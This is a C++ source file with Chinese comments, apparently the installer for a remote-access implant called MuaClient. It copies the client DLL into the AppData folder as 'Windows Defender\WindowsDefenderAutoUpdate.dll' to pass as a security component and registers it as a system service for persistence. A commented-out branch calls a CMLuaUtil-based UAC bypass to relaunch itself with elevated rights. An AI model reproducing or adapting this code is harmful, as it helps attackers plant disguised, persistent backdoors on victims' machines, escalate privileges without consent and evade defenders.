// InstallMuaClient.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h> 
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

#include "BypassUAC.h"
#include "SystemService.h"


int main()
{
	// 创建互斥量
	HANDLE hMutex = CreateMutex(NULL, TRUE, L"{EA102FF5-6BDA-41B3-BD42-028C03193095}");
	WaitForSingleObject(hMutex, INFINITE);

	WCHAR pszWillBypassUAC[] = L"{00E92116-51A2-4538-8228-03EA82922FC2}";
	WCHAR pszInstallCompleted[] = L"{FDA3820B-5558-4849-A085-D07257C2775F}";

	// 安装早已完成，直接退出
	WCHAR pszTempPathInstallCompleted[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathInstallCompleted);
	wcscat_s(pszTempPathInstallCompleted, pszInstallCompleted);
	if (PathFileExists(pszTempPathInstallCompleted)) {
		return -1;
	}

	WCHAR pszTempPathWillBypassUAC[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathWillBypassUAC);
	wcscat_s(pszTempPathWillBypassUAC, pszWillBypassUAC);

	//// 第一次，未提权
	//if (!PathFileExists(pszTempPathWillBypassUAC)) {
	//	// 创建 %TEMP%\pszWillBypassUAC 文件，表示即将BypassUAC
	//	HANDLE hFile = CreateFile(pszTempPathWillBypassUAC, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	//	if (hFile != nullptr) {
	//		CloseHandle(hFile);
	//	}		

	//	// 本程序所在路径
	//	WCHAR pszThisProgramPath[MAX_PATH];
	//	GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);

	//	// 提权后再次运行此程序
	//	CMLuaUtilBypassUAC(pszThisProgramPath);
	//}

	//// 非第一次，已提权
	//else {
		
		// 程序所在目录
		WCHAR pszMuaClientDllPath[MAX_PATH];
		GetModuleFileName(NULL, pszMuaClientDllPath, MAX_PATH);
		WCHAR *pPos = NULL;
		pPos = wcsrchr(pszMuaClientDllPath, '\\');
		*pPos = NULL;
		// 拼接成MuaClient.dll的路径（假设InstallMuaClient.exe和MuaClient.dll位于同一目录下）
		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");

		WCHAR pszNewMuaClientDllPath[MAX_PATH];
		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);	// C:\Users\iyzyi\AppData\Roaming
		wcscat_s(pszNewMuaClientDllPath, L"\\Windows Defender");
		if (!PathIsDirectory(pszNewMuaClientDllPath)) {								// C:\Users\iyzyi\AppData\Roaming\Windows Defender 不存在则创建文件夹
			CreateDirectory(pszNewMuaClientDllPath, NULL);
		}
		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll

		// 第三个参数表示覆盖旧文件
		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);


		RegisterSystemService(pszNewMuaClientDllPath);






		
		//删掉这个用于表示BypassUAC的文件
		if (PathFileExists(pszTempPathWillBypassUAC)) {
			DeleteFile(pszTempPathWillBypassUAC);
		}
			
		// 这里暂时注释，等完成install的代码后，再解开注释
		//// 安装完了，创建 %TEMP%\pszInstallCompleted文件
		//HANDLE hFile = CreateFile(pszTempPathInstallCompleted, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		//if (hFile != nullptr) {
		//	CloseHandle(hFile);
		//}
	

	//}

	// 释放互斥量
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	hMutex = nullptr;


	system("pause");
}